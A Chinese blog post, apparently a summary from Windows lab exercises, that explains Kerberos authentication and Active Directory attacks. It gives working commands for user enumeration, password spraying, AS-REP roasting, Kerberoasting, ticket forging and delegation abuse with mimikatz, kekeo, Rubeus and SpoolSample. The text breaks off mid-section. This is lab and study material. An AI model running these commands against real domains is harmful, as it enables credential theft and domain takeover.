

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Aurey7">
  <meta name="keywords" content="">
  
    <meta name="description" content="打 Windows 靶机常遇到Kerberos，在此总结一下  Kerberos原理 Kerberos认证过程 AS_REQ：Client向AS发起AS_REQ，请求凭据是Client Hash加密的时间戳 AS_REP：AS使用Client Hash进行解密，如果结果正确就返回用krbtgt的NTLM Hash加密的TGT票据（TGS中包含PAC，PAC包含Client SID和组） TGS_R">
<meta property="og:type" content="article">
<meta property="og:title" content="Kerberos Summary">
<meta property="og:url" content="http://aurey7.github.io.git/2023/07/26/Kerberos-Summary/index.html">
<meta property="og:site_name" content="Aurey7&#39;s Blog">
<meta property="og:description" content="打 Windows 靶机常遇到Kerberos，在此总结一下  Kerberos原理 Kerberos认证过程 AS_REQ：Client向AS发起AS_REQ，请求凭据是Client Hash加密的时间戳 AS_REP：AS使用Client Hash进行解密，如果结果正确就返回用krbtgt的NTLM Hash加密的TGT票据（TGS中包含PAC，PAC包含Client SID和组） TGS_R">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZUhrRpYZYV.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hR7kHInCAn.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R83v5LB-KS.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LcDgW17HNN.png">
<meta property="og:image" content="c:\Users\aurey\Downloads\Compressed\Kerberos\image\image_sj04BCwUub.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Nigw5qriD.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W3eE0H-c91.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dY170jQ6L-.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K48nX9vZtL.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DzgJwnlApq.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ptgvPyz844.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png">
<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png">
<meta property="article:published_time" content="2023-07-26T13:26:53.000Z">
<meta property="article:modified_time" content="2023-07-26T13:36:52.678Z">
<meta property="article:author" content="Aurey7">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZUhrRpYZYV.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Kerberos Summary - Aurey7&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"aurey7.github.io.git","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Aurey7</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://img.katck.com/images/2023/01/15/b6479d67545b18ee9500ca1d1254eea7.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Kerberos Summary"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-07-26 21:26" pubdate>
          2023年7月26日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          116 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Kerberos Summary</h1>
            
            
              <div class="markdown-body">
                
                <p>打 Windows 靶机常遇到Kerberos，在此总结一下</p>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZUhrRpYZYV.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h3 id="Kerberos原理"><a href="#Kerberos原理" class="headerlink" title="Kerberos原理"></a>Kerberos原理</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hR7kHInCAn.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h4 id="Kerberos认证过程"><a href="#Kerberos认证过程" class="headerlink" title="Kerberos认证过程"></a>Kerberos认证过程</h4><ol>
<li><strong>AS_REQ</strong>：Client向AS发起AS_REQ，请求凭据是Client Hash加密的时间戳</li>
<li><strong>AS_REP</strong>：AS使用Client Hash进行解密，如果结果正确就返回用krbtgt的NTLM Hash加密的TGT票据（TGS中包含PAC，PAC包含Client SID和组）</li>
<li><strong>TGS_REQ</strong>：Client凭借TGT票据向TGS发起针对特定服务的TGS_REQ请求</li>
<li><strong>TGS_REP</strong>：TGS使用krbtgt hash进行解密，正确则返回用服务hash加密的TGS票据</li>
<li><strong>AP_REQ</strong>：Client拿着TGS票据去请求服务</li>
<li><strong>AP_REP</strong>：服务使用自己的Hash解密TGS票据。正确则拿着PAC去KDC询问Client有无访问权限，域控解密PAC，判断Client的访问权限后返回结果。</li>
</ol>
<h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>原理：用户不存在和密码错误时，Kerberos返回的error-code不同</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<span class="hljs-string">&#x27;active.htb&#x27;</span>,userdb=<span class="hljs-string">&#x27;/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt&#x27;</span> 10.10.10.100<br></code></pre></td></tr></table></figure>
<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p><strong>攻击场景：</strong> 在已有用户名的情况下，可以尝试喷洒密码</p>
<p>普通的爆破就是用户名固定，爆破密码；密码喷洒是用固定的密码去跑用户名。</p>
<p><strong>工具：DomainPasswordSpray</strong> <a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray" title="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-DomainPasswordSpray</span> <span class="hljs-literal">-UserList</span> users.txt <span class="hljs-literal">-Domain</span> domain<span class="hljs-literal">-name</span> <span class="hljs-literal">-PasswordList</span> passlist.txt <span class="hljs-literal">-OutFile</span> sprayed<span class="hljs-literal">-creds</span>.txt<br></code></pre></td></tr></table></figure>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在Kerberos认证中，每个用户的票据都是由krbtgt NTLM-hash进行加密的，如果我们拥有krbtgt NTLM-hash，就可以伪造任意用户的TGT票据，这个票据也称为黄金票据。一般用来做权限维持。</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>Domain SID</li>
<li>krbtgt hash</li>
</ol>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p>
<ol>
<li>获取Domain SID</li>
</ol>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R83v5LB-KS.png" srcset="/img/loading.gif" lazyload alt=""></p>
<ol>
<li>利用上面获取到的Domain SID和krbtgt制作黄金票据</li>
</ol>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h4 id="意外情况"><a href="#意外情况" class="headerlink" title="意外情况"></a>意外情况</h4><p><strong>时钟同步</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python psexec.py htb.local/auray@forest -k -no-pass<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporatio<br><br>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br></code></pre></td></tr></table></figure>
<p>这种情况需要跟域进行时钟同步</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ntpdate 10.10.10.161<br></code></pre></td></tr></table></figure>
<p><strong>SMB连接失败</strong></p>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LcDgW17HNN.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>这种情况需要修改host，psexec的命令也得使用主机名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br>10.10.10.161 htb.local forest<br><br>python psexec.py htb.local/auray@forest -k -no-pass<br></code></pre></td></tr></table></figure>
<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p><strong>攻击场景：</strong> 如果拿到了用户名，目标服务器又暴露了kerberos端口，可以尝试AS-REP Roasting攻击</p>
<p>当被攻击账号设置 <strong>“不需要Kerberos预身份验证”</strong> 后，在AS_REP过程中就可以任意伪造用户名（无需Client Hash）请求凭据，AS会将伪造请求的用户名NTLM Hash加密后返回，对收到的AS_REP内容（enc-part底下的cipher，因为这部分时使用用户hash加密的session-key，我们通过离线爆破就可以获得用户hash）重新组合，能够拼接成 “Kerberos 5 AS_REP etype 23”（18200）的格式，使用hashcat对其进行爆破，最终获取该用户的明文口令</p>
<p><img src="C:\Users\aurey\Downloads\Compressed\Kerberos\image\image_sj04BCwUub.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" /></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span class="hljs-variable">$&#123;user&#125;</span> | grep -v impacket;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
<p>拿到Hash之后可以通过hashcat爆破密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force<br>john --wordlist=/usr/share/wordlists/rockyou.txt svc.txt<br><br></code></pre></td></tr></table></figure>
<h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h3><p>Kerberos除了第一步AS_REP是使用用户hash加密时间戳之外，其他的步骤的验证都是通过票据，这个票据可以是TGT票据或TGS票据。因为票据里面的内容主要是session_key和ticket（使用服务hash加密的，服务包括krbtgt），拿到票据之后，我们就可以用这个票据来作为下阶段的验证了</p>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p><strong>原理：</strong> 在TGS_REP中，用户将收到由目标服务实例的NTLM Hash加密的TGS票据，加密算法为RC4-HMAC</p>
<p><strong>利用场景：</strong> 当我们拥有一个用户凭据时，我们可以请求TGS票据，再进行爆破</p>
<p>对于域内的任何主机，都可以通过查询SPN，向域内的所有服务请求TGS（因为KDC不会验证权限：用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS）然后进行暴力破解，获取服务的NTLM Hash。但只有域用户的SPN是可以利用的（因为机器账户的SPN每30天会更改随机128各字符密码导致无法破解），所以在实际过程中要注意攻击的是域用户。</p>
<p><strong>利用impacket中的GetUserSPNs.py进行攻击</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request<br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Nigw5qriD.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>使用john进行爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john test.hash --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W3eE0H-c91.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>在TGS_REP中的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。</p>
<p><strong>相较于黄金票据</strong>，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票据只能访问特定服务</p>
<p><strong>注意：</strong> 伪造的白银票据没有携带有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则白银票据将不起作用。</p>
<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>委派是将域用户的权限委派给服务账户，委派之后，服务账户就获得了域用户的身份去行动</p>
<p>注意：能够被委派的用户只能是服务账户或机器账户</p>
<h4 id="三种委派"><a href="#三种委派" class="headerlink" title="三种委派"></a>三种委派</h4><ul>
<li>非约束委派是指用户账户将自身的TGT转发给服务账户使用</li>
<li>约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问特定服务资源</li>
<li>基于资源的约束委派是将委派的管理移交给服务资源进行控制，其余和约束委派基本相同</li>
</ul>
<h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><p>当service1的服务账户开启了非约束委派后，user访问service1时，service1会将user的TGT保存在ISASS内存中，然后service1就可以利用TGT以user的身份访问域中的任何user可以访问的服务</p>
<p>非约束委派的设置需要SeEnableDelegation权限，一般是管理员具有此权限</p>
<h4 id="非约束委派流程"><a href="#非约束委派流程" class="headerlink" title="非约束委派流程"></a><strong>非约束委派流程</strong></h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dY170jQ6L-.png" srcset="/img/loading.gif" lazyload alt=""></p>
<ol>
<li>域内用户A通过Kerberos认证后访问Web服务器</li>
<li>Web服务器以服务账户B向KDC请求用户A的可转发票据TGT</li>
<li>KDC检查B的委派属性，下发TGT</li>
<li>服务账户B使用TGT向KDC申请服务票据TGS</li>
<li>KDC检查委派属性和申请的服务，下发TGS</li>
<li>服务账户使用TGS访问其他服务</li>
</ol>
<h4 id="侦查思路：找到非约束委派账户"><a href="#侦查思路：找到非约束委派账户" class="headerlink" title="侦查思路：找到非约束委派账户"></a>侦查思路：找到非约束委派账户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ADFind查询非约束委派普通账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># ADFind查询非约束机器账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># PowerView查询非约束委派的机器账户</span><br>powershell-import PowerView.ps1<br>powershell Get-NetComputer –unconstrained | select dnshostname, samaccountname<br></code></pre></td></tr></table></figure>
<h4 id="利用服务账户获取管理员权限"><a href="#利用服务账户获取管理员权限" class="headerlink" title="利用服务账户获取管理员权限"></a>利用服务账户获取管理员权限</h4><p>已知被设置非约束性委派属性的服务账户的口令明文，则可以获取域管理员权限</p>
<ol>
<li>现在已知域内服务账号sqlsvc的明文口令，则可以使用kekeo构造sqlsvc服务账户的票据</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;tgt::ask /user:mssqlsrv /domain:redteam.lab /password:123.com /ticket:mssqlsrv.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<ol>
<li>由于sqlsvc被设置为非约束委派，因此可以利用刚才伪造的sqlsvc票据，向域服务器发起域控CIFS服务的管理员权限的TGS</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;Tgs::s4u /tgt:TGT_mssqlsrv@REDTEAM.LAB_krbtgt~redteam.lab@REDTEAM.LAB.kirbi /user:administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<ol>
<li>此时内存中已经有了访问域服务器 CIFS 服务的域管理员的 TGS 票据，需要将该票据注入当前的会话中，使用 mimikatz 的 <code>kerberos::ptt</code> 命令可完成票据的注入。注入票据后，当前的会话具备了访问域服务器 C 盘目录的权限</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_administrator@redteam.lab@REDTEAM.LAB_mssqlsrv@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="利用打印机漏洞"><a href="#利用打印机漏洞" class="headerlink" title="利用打印机漏洞"></a>利用打印机漏洞</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起Kerberos或NTLM认真请求</p>
<p><strong>前提条件：</strong></p>
<ol>
<li>Administrator权限</li>
<li>域用户的账号密码</li>
<li>域控开启打印机</li>
</ol>
<p><strong>工具：</strong><a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample/" title="https://github.com/leechristensen/SpoolSample/">https://github.com/leechristensen/SpoolSample/</a></p>
<p><strong>利用过程：</strong></p>
<ol>
<li>查询打印服务是否开启（域控上查询）<br><code>sc query spooler</code></li>
<li>使用Rubeus监听来自域控的票据<br><code>Rubeus.exe monitor /interval:2 /filteruser:DC2016$</code></li>
<li>使用SpoolSample执行打印机漏洞利用，进行强制验证<br><code>SpoolSample.exe DC2016 WIN10-1</code></li>
<li>Rubeus监听到票据并导入该票据<br><code>Rubeus.exe /ptt /ticket:dt...</code></li>
<li>使用mimikatz导出Hash<br><code>mimikatz.exe &quot;lsadump::dcsync /domain:aut.htb /user:aut\Administrator&quot; &quot;exit&quot;</code></li>
</ol>
<h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><p>在约束委派的Kerberos中，同样会将TGT发送给相关受委派的服务，但由于S4U2proxy的影响，该票据只能访问指定的服务</p>
<h4 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h4><p>允许受约束委派的服务 <strong>（主动）代表任意用户向KDC请求服务自身</strong>，从而获取一张该用户（任意用户）的当前受约束委派服务的票据TGS（ST），该服务票据包含用户的相关信息，比如该用户的组信息等</p>
<h4 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h4><p>允许受约束委派的服务通过服务票据ST，代表用户去请求指定的服务</p>
<p>配置了约束委派的账户属性会有两个变化：</p>
<ol>
<li>账户的<code>userAccountControl</code>属性会被设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，值为<code>16781312</code></li>
<li>账户的<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务</li>
</ol>
<h4 id="侦查思路：找到约束委派账户"><a href="#侦查思路：找到约束委派账户" class="headerlink" title="侦查思路：找到约束委派账户"></a>侦查思路：找到约束委派账户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># AdFind.exe查询约束委派机器账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br><span class="hljs-comment"># AdFind.exe查询约束委派服务账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto<br><br><span class="hljs-comment"># 导入</span><br>powershell-import PowerView.ps1<br><span class="hljs-comment"># PowerView查询约束委派机器账户</span><br>powershell Get-DomainComputer -TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize<br><span class="hljs-comment"># PowerView查询约束委派服务账户</span><br>powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl<br><br></code></pre></td></tr></table></figure>
<p>约束委派共计的关键就是<strong>获得可转发的服务票据ST</strong></p>
<p>只要控制配置约束委派服务的机器，并获得它的密码。就可以劫持这台主机的kerberos请求，最终获得任意用户权限的ticket</p>
<h4 id="使用机器账户的票据"><a href="#使用机器账户的票据" class="headerlink" title="使用机器账户的票据"></a>使用机器账户的票据</h4><p><strong>利用条件：</strong></p>
<ol>
<li>需要Administrator权限</li>
<li>目标机器账户配置了约束性委派</li>
</ol>
<p><strong>利用过程：</strong></p>
<p>使用mimikatz工具导出Isass.exe进程中所有的票据，得到想要的服务票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出票据</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K48nX9vZtL.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>使用kekeo工具申请服务票据（S4U2Proxy）</p>
